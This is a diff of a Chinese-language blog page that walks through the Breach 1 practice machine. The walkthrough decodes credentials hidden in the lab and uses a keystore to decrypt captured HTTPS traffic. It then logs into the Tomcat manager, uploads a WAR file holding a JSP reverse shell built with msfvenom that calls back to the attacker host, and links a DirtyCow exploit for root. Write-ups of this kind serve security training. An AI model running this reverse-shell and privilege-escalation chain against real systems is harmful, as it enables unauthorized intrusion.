@@ -22,6 +22,7 @@
     var CONFIG = {"hostname":"evilarsene.icu","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":-1,"unescape":true,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
+
   <meta name="description" content="Breach 1攻击机:192.168.110.3">
 <meta property="og:type" content="article">
 <meta property="og:title" content="靶场Breach 1">
@@ -29,11 +30,30 @@
 <meta property="og:site_name" content="Love ❤ Hacking">
 <meta property="og:description" content="Breach 1攻击机:192.168.110.3">
 <meta property="og:locale">
+<meta property="og:image" content="http://evilarsene.icu/images/Breach-1/1.jpg">
+<meta property="og:image" content="http://evilarsene.icu/images/Breach-1/2.jpg">
+<meta property="og:image" content="http://evilarsene.icu/images/Breach-1/3.jpg">
+<meta property="og:image" content="http://evilarsene.icu/images/Breach-1/5.jpg">
+<meta property="og:image" content="http://evilarsene.icu/images/Breach-1/6.jpg">
+<meta property="og:image" content="http://evilarsene.icu/images/Breach-1/4.jpg">
+<meta property="og:image" content="http://evilarsene.icu/images/Breach-1/7.jpg">
+<meta property="og:image" content="http://evilarsene.icu/images/Breach-1/8.jpg">
+<meta property="og:image" content="http://evilarsene.icu/images/Breach-1/10.jpg">
+<meta property="og:image" content="http://evilarsene.icu/images/Breach-1/9.jpg">
+<meta property="og:image" content="http://evilarsene.icu/images/Breach-1/11.jpg">
+<meta property="og:image" content="http://evilarsene.icu/images/Breach-1/12.jpg">
+<meta property="og:image" content="http://evilarsene.icu/images/Breach-1/13.jpg">
+<meta property="og:image" content="http://evilarsene.icu/images/Breach-1/14.jpg">
+<meta property="og:image" content="http://evilarsene.icu/images/Breach-1/15.jpg">
+<meta property="og:image" content="http://evilarsene.icu/images/Breach-1/16.jpg">
+<meta property="og:image" content="http://evilarsene.icu/images/Breach-1/17.jpg">
+<meta property="og:image" content="http://evilarsene.icu/images/Breach-1/18.jpg">
 <meta property="article:published_time" content="2020-06-04T05:54:12.000Z">
-<meta property="article:modified_time" content="2020-09-07T15:43:47.862Z">
+<meta property="article:modified_time" content="2020-12-08T06:02:15.539Z">
 <meta property="article:author" content="EvilArsene">
 <meta property="article:tag" content="Linux靶机">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://evilarsene.icu/images/Breach-1/1.jpg">
 
 <link rel="canonical" href="http://evilarsene.icu/2020/06/04/%E9%9D%B6%E5%9C%BA-Breach-1/">
 
@@ -223,7 +243,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-09-07 23:43:47" itemprop="dateModified" datetime="2020-09-07T23:43:47+08:00">2020-09-07</time>
+                <time title="修改时间：2020-12-08 14:02:15" itemprop="dateModified" datetime="2020-12-08T14:02:15+08:00">2020-12-08</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -249,57 +269,57 @@
         <h1 id="Breach-1"><a href="#Breach-1" class="headerlink" title="Breach 1"></a>Breach 1</h1><p>攻击机:192.168.110.3</p>
 <p>靶机:192.168.110.140</p>
 <p>*注:该靶场需要配置静态IP:192.168.110.140</p>
-<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>![1](/images/Breach 1/1.jpg)</p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Breach-1/1.jpg" alt="1"></p>
 <p>端口扫描就遇到了问题，基本上全端口开放，显然是某种安全措施</p>
 <h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>查看80端口web服务，发现存在页面</p>
 <p>查看网页源代码</p>
-<p>![2](/images/Breach 1/2.jpg)</p>
+<p><img src="/images/Breach-1/2.jpg" alt="2"></p>
 <p>存在一段Base64加密的字符串，对它进行解密</p>
-<p>![3](/images/Breach 1/3.jpg)</p>
+<p><img src="/images/Breach-1/3.jpg" alt="3"></p>
 <p>得到<code>pgibbons:damnitfeel$goodtobeagang$ta</code></p>
 <p>之后发现页面图片存在链接，点击跳转</p>
-<p>![5](/images/Breach 1/5.jpg)</p>
+<p><img src="/images/Breach-1/5.jpg" alt="5"></p>
 <p>之后点击<code>Employee portal</code>,跳转<code>impresscms/user.php</code></p>
-<p>![6](/images/Breach 1/6.jpg)</p>
+<p><img src="/images/Breach-1/6.jpg" alt="6"></p>
 <p>发现了一个登录页面，尝试之前发现的账户密码</p>
 <p>账号:pgibbons</p>
 <p>密码:damnitfeel$goodtobeagang$ta</p>
-<p>![4](/images/Breach 1/4.jpg)</p>
+<p><img src="/images/Breach-1/4.jpg" alt="4"></p>
 <p>成功登录，左侧发现有3封邮件可以查看</p>
 <p>第一封提示 Bill有一个非常安全的密码<br>第二封提示 机器上存在IDS/IPS<br>第三封提示 一个密钥文件在<code>192.168.110.140/.keystore</code></p>
 <p>之后我又在主页面发现了一个SSL测试数据包</p>
-<p>![7](/images/Breach 1/7.jpg)</p>
+<p><img src="/images/Breach-1/7.jpg" alt="7"></p>
 <p>接着</p>
-<p>![8](/images/Breach 1/8.jpg)</p>
+<p><img src="/images/Breach-1/8.jpg" alt="8"></p>
 <p>而且该页面还提示<code>the alias, storepassword and keypassword are all set to &#39;tomcat&#39;</code></p>
 <p>之后使用wireshark查看pcap包，内容全都被加密了，不过可以发现，大多数包都是走的8433端口</p>
-<p>![10](/images/Breach 1/10.jpg)</p>
+<p><img src="/images/Breach-1/10.jpg" alt="10"></p>
 <h3 id="keytool导出SSL证书"><a href="#keytool导出SSL证书" class="headerlink" title="keytool导出SSL证书"></a>keytool导出SSL证书</h3><p>想到之前的keystore文件，keytool的基本用法</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">命令:</span><br><span class="line"> -certreq            生成证书请求</span><br><span class="line"> -changealias        更改条目的别名</span><br><span class="line"> -delete             删除条目</span><br><span class="line"> -exportcert         导出证书</span><br><span class="line"> -genkeypair         生成密钥对</span><br><span class="line"> -genseckey          生成密钥</span><br><span class="line"> -gencert            根据证书请求生成证书</span><br><span class="line"> -importcert         导入证书或证书链</span><br><span class="line"> -importpass         导入口令</span><br><span class="line"> -importkeystore     从其他密钥库导入一个或所有条目</span><br><span class="line"> -keypasswd          更改条目的密钥口令</span><br><span class="line"> -list               列出密钥库中的条目</span><br><span class="line"> -printcert          打印证书内容</span><br><span class="line"> -printcertreq       打印证书请求的内容</span><br><span class="line"> -printcrl           打印 CRL 文件的内容</span><br><span class="line"> -storepasswd        更改密钥库的存储口令</span><br></pre></td></tr></table></figure>
 
-<p>![9](/images/Breach 1/9.jpg)</p>
+<p><img src="/images/Breach-1/9.jpg" alt="9"></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">keytool -importkeystore -srckeystore c:\keystore -destkeystore c:\tomcatkeystore.p12 -deststoretype PKCS12 -srcalias tomcat</span><br><span class="line">-importkeystore    		从其他密钥库导入一个或所有条目</span><br><span class="line">-srckeystore          	源keystore文件</span><br><span class="line">-destkeystore         	新keystore文件</span><br><span class="line">-deststoretype       	证书格式</span><br><span class="line">-srcalias 	            源实体别名</span><br></pre></td></tr></table></figure>
 
 <p>之后点击Edit→Preferences→Protocols→TLS</p>
-<p>![11](/images/Breach 1/11.jpg)</p>
+<p><img src="/images/Breach-1/11.jpg" alt="11"></p>
 <p>我们成功解密了HTTPS数据包</p>
-<p>![12](/images/Breach 1/12.jpg)</p>
+<p><img src="/images/Breach-1/12.jpg" alt="12"></p>
 <p>之后在数据包寻找线索</p>
-<p>![13](/images/Breach 1/13.jpg)</p>
+<p><img src="/images/Breach-1/13.jpg" alt="13"></p>
 <p>在数据包18中发现了疑似后台登录页面<code>/_M@nag3Me/html</code><br>找到了加密后的登录凭据<code>dG9tY2F0OlR0XDVEOEYoIyEqdT1HKTRtN3pC</code></p>
-<p>![14](/images/Breach 1/14.jpg)</p>
+<p><img src="/images/Breach-1/14.jpg" alt="14"></p>
 <p>解密后tomcat:Tt\5D8F(#!*u=G)4m7zB</p>
 <p>登录后台地址<code>https://192.168.110.140:8443/_M@nag3Me/html</code>，挂着burpsuite解决证书问题</p>
-<p>![15](/images/Breach 1/15.jpg)</p>
+<p><img src="/images/Breach-1/15.jpg" alt="15"></p>
 <p>输入账户密码</p>
-<p>![16](/images/Breach 1/16.jpg)</p>
+<p><img src="/images/Breach-1/16.jpg" alt="16"></p>
 <p>终于进入了后台</p>
 <h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h3 id="上传Getshell"><a href="#上传Getshell" class="headerlink" title="上传Getshell"></a>上传Getshell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java&#x2F;jsp_shell_reverse_tcp LHOST&#x3D;192.168.110.3 LPORT&#x3D;4444 -f war -o &#x2F;root&#x2F;Desktop&#x2F;evil.war</span><br></pre></td></tr></table></figure>
 
-<p>![17](/images/Breach 1/17.jpg)</p>
+<p><img src="/images/Breach-1/17.jpg" alt="17"></p>
 <h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="dirtycow"><a href="#dirtycow" class="headerlink" title="dirtycow"></a>dirtycow</h3><p>直接使用脏牛提权</p>
 <p><a target="_blank" rel="noopener" href="https://github.com/exrienz/DirtyCow">https://github.com/exrienz/DirtyCow</a></p>
-<p>![18](/images/Breach 1/18.jpg)</p>
+<p><img src="/images/Breach-1/18.jpg" alt="18"></p>
 <h3 id="计划任务提权"><a href="#计划任务提权" class="headerlink" title="计划任务提权"></a>计划任务提权</h3><p>网上找到的，测试之后也是可以的，不过也太绕了</p>
 <p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/171318.html">链接</a></p>
 
@@ -401,7 +421,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">130</span>
+          <span class="site-state-item-count">131</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -449,7 +469,7 @@
 <div class="copyright">
   
   &copy; 
-  <span itemprop="copyrightYear">2020</span>
+  <span itemprop="copyrightYear">2021</span>
   <span class="with-love">
     <i class="fa fa-user"></i>
   </span>
